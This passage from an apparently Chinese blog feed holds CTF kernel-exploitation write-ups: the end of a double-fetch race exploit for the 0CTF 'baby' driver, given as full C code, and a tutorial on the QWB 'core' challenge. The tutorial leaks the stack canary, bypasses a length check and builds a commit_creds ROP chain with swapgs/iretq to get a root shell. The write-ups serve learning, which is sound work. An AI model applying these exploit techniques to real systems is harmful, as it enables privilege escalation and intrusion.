等现代操作系统中，虚拟内存地址通常被划分为内核空间和用户空间。内核空间负责运行内核代码、驱动模块代码等，权限较高。而用户空间运行用户代码，并通过系统调用进入内核完成相关功能。通常情况下，用户空间向内核传递数据时，内核先通过通过 copy_from_user 等拷贝函数将用户数据拷贝至内核空间进行校验及相关处理，但在输入数据较为复杂时，内核可能只引用其指针，而将数据暂时保存在用户空间进行后续处理。此时，该数据存在被其他恶意线程篡改风险，造成内核验证通过数据与实际使用数据不一致，导致内核代码执行异常。</span><br></pre></td></tr></table></figure><p>因此我们可以先在结构体的flag位置写入用户空间的地址，在创建一个恶意线程，该线程的任务就是不断的修改我们的flag地址为内核地址，如果该修改操作发生在通过check后，那么就可以通过后面的依次比较从而输出flag。</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> finish=<span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> addr;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">attr</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *flag;</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_attr</span><span class="params">(<span class="type">void</span> *s)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span> *<span class="title">s1</span>=</span>s;</span><br><span class="line">    <span class="keyword">if</span>(finish==<span class="number">0</span>)&#123;</span><br><span class="line">        s1-&gt;flag=addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> *ptr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span> <span class="title">t</span>;</span></span><br><span class="line">    <span class="type">pthread_t</span> t1;</span><br><span class="line">    <span class="type">int</span> fd=open(<span class="string">&quot;/dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6666</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; /tmp/record.txt&quot;</span>);</span><br><span class="line">    <span class="type">int</span> addr_fd=open(<span class="string">&quot;/tmp/record.txt&quot;</span>,O_RDONLY);</span><br><span class="line">    lseek(addr_fd,<span class="number">-0x1000</span>,SEEK_END);   <span class="comment">//control the position of r/w</span></span><br><span class="line">    read(addr_fd,buf,<span class="number">0x1000</span>);</span><br><span class="line">    close(addr_fd);</span><br><span class="line">    ptr=<span class="built_in">strstr</span>(buf,<span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(ptr==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Not found&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        ptr+=<span class="number">16</span>;</span><br><span class="line">        addr=strtoull(ptr,ptr+<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;flag addr: %p&quot;</span>,addr);</span><br><span class="line">    &#125;</span><br><span class="line">    t.flag=buf;</span><br><span class="line">    t.len=<span class="number">33</span>;</span><br><span class="line">    pthread_create(&amp;t1,<span class="literal">NULL</span>,change_attr,&amp;t);   <span class="comment">//创建线程</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x500</span>;i++)&#123;</span><br><span class="line">        ioctl(fd,<span class="number">0x1337</span>,&amp;t);</span><br><span class="line">        t.flag=buf;     <span class="comment">//更新flag地址增大成功概率</span></span><br><span class="line">    &#125;</span><br><span class="line">    finish=<span class="number">1</span>;</span><br><span class="line">    pthread_join(t1,<span class="literal">NULL</span>);   <span class="comment">//等待线程结束</span></span><br><span class="line">    close(fd);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>补充：<br>编译时要多加-pthread选项<code>gcc exp.c -pthread -static -o exploit</code><br>gef attach的命令<code>gef-remote -q localhost:1234</code><br>关闭地址随机化方法：<br>在-append最后加上 nokaslr</p><p>参考：<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch-zh/</a><br><a href="https://x3h1n.github.io/2019/08/27/20180ctf-final-baby/">https://x3h1n.github.io/2019/08/27/20180ctf-final-baby/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> KERNEL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel_pwn ROP</title>
      <link href="/2020/11/07/kernel_pwn(1)/"/>
      <url>/2020/11/07/kernel_pwn(1)/</url>
      
        <content type="html"><![CDATA[<h3 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h3><blockquote><p>通常一个内核由负责响应中断的中断服务程序，负责管理多个进程从而分享处理器时间的调度程序，负责管理进程地址空间的内存管理程序，进程间通讯等系统服务程序共同组成。  –linux内核设计与实现</p></blockquote><p>一直想学kernel pwn，但迟迟没有开始（懒🤦）。最近又心血来潮，翻开了<code>linux内核设计与实现</code>这本书，准备看这本来入门kernel。这将会是一个系列，记录下自己的学习过程（读书笔记+kernel_pwn题目复现），希望自己可以坚持下去🎃。</p><span id="more"></span><p>kernel顾名思义是操作的核心，它其实起到了一个承上（用户空间）启下（硬件设备）的作用。应用程序通过系统调用来与内核通信，内核通过处理中断（通过中断号找中断服务程序）来管理系统的硬件设备。<br>注意：很多操作系统的中断服务程序，包括linux，都不在进程上下文中执行；而是在专门的中断上下文中运行，与所有进程都无关。</p><h4 id="kernel-pwn-ROP"><a href="#kernel-pwn-ROP" class="headerlink" title="kernel_pwn_ROP"></a>kernel_pwn_ROP</h4><blockquote><p>题目来自qwd2018_core。</p></blockquote><p>就ctf里kernel pwn而言我们所要做的就是提权（得到一个root权限的进程）。挖掘出存在于kernel模块里的漏洞并通过用户态的相应的系统调用进到内核态中去触发漏洞从而到达提权的目的。<br>直接撸题✔<br>解压之后可以看到这些文件：<br>bzImage：压缩后的内核镜像<br>vmlinux：编译出的原始内核文件，没有被压缩而且是静态连接的。<br>.sh：qemu的启动脚本<br>.cpio：打包后的文件系统</p><p>我们首先看下.sh文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure><p>解释下参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-m 指定内存(RAM)大小</span><br><span class="line">-kernel 指定内核镜像</span><br><span class="line">-initrd 指定内核启动的文件系统</span><br><span class="line">-qppend 附加选项 指定no kaslr可以关闭地址随机化</span><br><span class="line">-s 相当于-gdb tcp::1234，可以用gdb ./vmlinux调试</span><br><span class="line">-smp 用于声明所有可能用到的cpus, i.e. sockets cores threads = maxcpus.</span><br><span class="line">-cpu 设置CPU的安全选项</span><br></pre></td></tr></table></figure><p>保护机制：<br>常见的有kaslr（地址随机化），smep(内核态不可执行用户态的代码)，smap(内核态不可访问用户态的数据)。</p><p>解题过程：<br>拿到这些文件后首先要做的就是解包.cpio文件，但不要在共享文件夹下进行此操作，会导致解包的软链接出错。我一般是这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cp give_to_player /home/an9ela/kernel</span><br><span class="line">cd /home/an9ela/kernel/give_to_player</span><br><span class="line">mkdir core</span><br><span class="line">mv core.cpio core.cpio.gz</span><br><span class="line">mv core.cpio.gz ./core</span><br><span class="line">cd core</span><br><span class="line">gunzip core.cpio.gz</span><br><span class="line">cpio -idmv &lt; core.cpiow  //解包操作</span><br><span class="line"></span><br><span class="line">find . | cpio -o --format=newc &gt; ../core.cpio //打包操作，这题给了gen_cpio.sh直接./gen_cpio core.cpio</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到文件系统之后首先要看的就是Init文件了，这个是初始化内核时所进行的操作“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms    //备份了kallsyms到tmp文件夹下</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict  //即我们不能通过/proc/kallsyms获得函数地址，但/tmp/kallsyms是不受影响的</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict //无法通过dmesg查看内核的输出</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2</span><br><span class="line">insmod /core.ko    //插入core.ko模块，该模块也即我们要重点分析的模块</span><br><span class="line">poweroff -d 120 -f &amp;  //这句设置了120s自动关机，为不影响调试可以删掉</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh   //我们的shell的uidgid为1000，root为0</span><br><span class="line">echo &#x27;sh end!\n&#x27;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>接下来就要分析core.ko模块了，可以用ida打开。<br>首先查看init_module函数，该函数会在模块加载时执行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(&amp;unk_2DE);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数调用proc_create创建了名为core的虚拟文件，应用层通过读写改文件实现与内核的交互。<br>其中第三个参数file_operations存储了内核模块提供的对设备进行各种操作的函数指针，对于用户态而言也可以理解为我们可以通过core文件能进行那些操作。<br>点进去fop</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000000438                 dq offset core_write</span><br><span class="line">.data:0000000000000468                 dq offset core_ioctl</span><br><span class="line">.data:0000000000000498                 dq offset core_release</span><br></pre></td></tr></table></figure><p>可见能执行的操作为write,ioctl,release</p><p>接下来是core_ioctl函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line"></span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = v3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(v3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>int ioctl(int fd, ind cmd, …);是设备驱动程序中对设备的io通道进行管理的函数。其中fd是用户程序打开设备时使用open函数返回的文件标识符，cmd是用户程序对设备的控制命令。<br>ioctl是文件结构中的一个属性分量，如果你的驱动程序提供了对ioctl的支持，用户就可以在用户程序中使用ioctl函数实现对设备io通道的控制。<br>意思就是如果lkm中提供了ioctl功能（比如上面的这个函数），并且实现了对应指令的操作，那么在用户态中，通过这个驱动程序，我们就可以调用ioctl函数来直接调用模块中的操作。</p><p>而这里就提供了ioctl功能，继续分析core_read()。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  __int64 *v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 = (__int64 *)((<span class="type">char</span> *)v2 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)&amp;v5, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  result = copy_to_user(v1, (<span class="type">char</span> *)&amp;v5 + off, <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>  copy_to_user()函数中将v5+off中的0x40长度的数据拷贝到用户空间，其中off是bss上的全局变量。<br>  而case 0x6677889C就给了我们控制off的机会，因此我们利用通过控制off&#x3D;0x40来leak canary。</p><p>  core_copy_func函数：<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  __int64 __fastcall <span class="title function_">core_copy_func</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(&amp;v2, &amp;name, (<span class="type">unsigned</span> __int16)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>首先对长度进行了检查，但注意数据类型，a1为int64，而在qmemcpy函数里类型了uint16，因此我们设计a1为0xffffffff00000000|(real_len)使int64为负数，从而绕过检查的同时造成溢出。</p><p>这样分析下来利用思路就很明确了：<br>先利用core_read()泄露canary，之后再利用core_cpoy_func在内核栈里构造rop，使其在内核态执行commit_creds(prepare_kernel_cred(0))使得进程的uidgid&#x3D;0，然后返回到用户态执行system(“&#x2F;bin&#x2F;sh)从而完成提权。</p><p>难点在于rop的构造。<br>对于执行commit_creds(prepare_kernel_cred(0))来说，传参和用户态的一致，但要注意commit_creds()的参数是prepare_kernel_cred(0)函数的返回值。<br>从内核态返回用户态时要用到条指令swapgs和iretq。在执行iretq之前，执行swapgs指令。该指令通过用一个MSR中的值交换GS寄存器的内容，用来获取指向内核数据结构的指针，然后才能执行系统调用之类的内核空间程序。</p><p>iret(特权返回)指令从内核空间返回到用户空间进程。但是iret(64位下为iretq)期望的特定的堆栈布局如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">|----------------------|</span><br><span class="line">| iretq_ret            |</span><br><span class="line">|----------------------|</span><br><span class="line">| RIP                  |&lt;== low mem</span><br><span class="line">|----------------------|</span><br><span class="line">| CS                   |</span><br><span class="line">|----------------------|</span><br><span class="line">| EFLAGS               |</span><br><span class="line">|----------------------|</span><br><span class="line">| RSP                  |</span><br><span class="line">|----------------------|</span><br><span class="line">| SS                   |&lt;== high mem</span><br><span class="line">|----------------------|</span><br></pre></td></tr></table></figure><p>新的用户空间指令指针(RIP)，用户空间堆栈指针(RSP)，代码和堆栈段选择器(CS和SS)以及具有各种状态信息的EFLAGS寄存器。<br>一般我们用以下的扩展内联汇编获得所需的寄存器的值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">     <span class="keyword">asm</span>(</span><br><span class="line">       <span class="string">&quot; mov %%cs, %0\n&quot;</span></span><br><span class="line">       <span class="string">&quot;mov %%ss,%1\n&quot;</span></span><br><span class="line">       <span class="string">&quot;mov %%rsp,%3\n&quot;</span></span><br><span class="line">       <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">       <span class="string">&quot;popq %2&quot;</span></span><br><span class="line">       :<span class="string">&quot;=r&quot;</span>(tf.cs),<span class="string">&quot;=r&quot;</span>(tf.ss),<span class="string">&quot;=r&quot;</span>(tf.rflags),<span class="string">&quot;=r&quot;</span>(tf.rsp)    <span class="comment">//output</span></span><br><span class="line">       :                                                        <span class="comment">//input</span></span><br><span class="line">       :<span class="string">&quot;memory&quot;</span>                                               <span class="comment">//list of clobbered registers即改变的内容</span></span><br><span class="line">    );</span><br><span class="line">    tf.rsp -= <span class="number">4096</span>;</span><br><span class="line">    tf.rip = &amp;launch_shell;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>rop：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 50</span><br><span class="line">00:0000│ rsp  0xffffa47a800e7e60 —▸ 0x7ffec40e5570 ◂— add    byte ptr [rcx - 0x70], dl /* 0x44777d3bde905100 */</span><br><span class="line">01:0008│      0xffffa47a800e7e68 —▸ 0xffffffffb2200b2f ◂— pop    rdi /* 0x722540358b4cc35f */</span><br><span class="line">02:0010│      0xffffa47a800e7e70 ◂— 0</span><br><span class="line">03:0018│      0xffffa47a800e7e78 —▸ 0xffffffffb229cce0 ◂— push   rbp /* 0x153d8b48fd894855 */</span><br><span class="line">04:0020│      0xffffa47a800e7e80 —▸ 0xffffffffb2221e53 ◂— pop    rcx /* 0xffdf89480127c359 */</span><br><span class="line">05:0028│      0xffffa47a800e7e88 —▸ 0xffffffffb229c8e0 ◂— push   r12 /* 0x4025248b4c655441 */</span><br><span class="line">06:0030│      0xffffa47a800e7e90 —▸ 0xffffffffb23ae978 ◂— mov    rdi, rax /* 0xc28ee9e1ffc78948 */</span><br><span class="line">07:0038│      0xffffa47a800e7e98 —▸ 0xffffffffb2c012da ◂— swapgs  /* 0x485590c39df8010f */</span><br><span class="line">08:0040│      0xffffa47a800e7ea0 ◂— 0</span><br><span class="line">09:0048│      0xffffa47a800e7ea8 —▸ 0xffffffffb2250ac2 ◂— iretq   /* 0x1f0f2e6690c3cf48 */</span><br><span class="line">0a:0050│      0xffffa47a800e7eb0 —▸ 0x400eac ◂— push   rbp</span><br><span class="line">0b:0058│      0xffffa47a800e7eb8 ◂— 0x33 /* &#x27;3&#x27; */</span><br><span class="line">0c:0060│      0xffffa47a800e7ec0 ◂— 0x282</span><br><span class="line">0d:0068│      0xffffa47a800e7ec8 —▸ 0x7ffec40e45c0 ◂— 0</span><br><span class="line">0e:0070│      0xffffa47a800e7ed0 ◂— 0x2b /* &#x27;+&#x27; */</span><br><span class="line">0f:0078│      0xffffa47a800e7ed8 ◂— 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*(ptr + i++) = canary;</span><br><span class="line">*(ptr + i++) = rbp;</span><br><span class="line">*(ptr + i++) = prdi_ret;</span><br><span class="line">*(ptr + i++) = 0;</span><br><span class="line">*(ptr + i++) = prepare_kernel_cred;</span><br><span class="line">*(ptr + i++) = prcx_ret;</span><br><span class="line">*(ptr + i++) = commit_creds;</span><br><span class="line">*(ptr + i++) = mov_rdi_rax_jmp_rcx;</span><br><span class="line"></span><br><span class="line">*(ptr + i++) = swapgs_p_ret;</span><br><span class="line">*(ptr + i++) = 0;</span><br><span class="line">*(ptr + i++) = iretq_ret;</span><br><span class="line">*(ptr + i++) = (uint64_t) launch_shell;</span><br><span class="line">*(ptr + i++) = tf.cs;</span><br><span class="line">*(ptr + i++) = tf.rflags;</span><br><span class="line">*(ptr + i++) = tf.rsp;</span><br><span class="line">*(ptr + i++) = tf.ss;</span><br></pre></td></tr></table></figure><p>exp:</p><figure 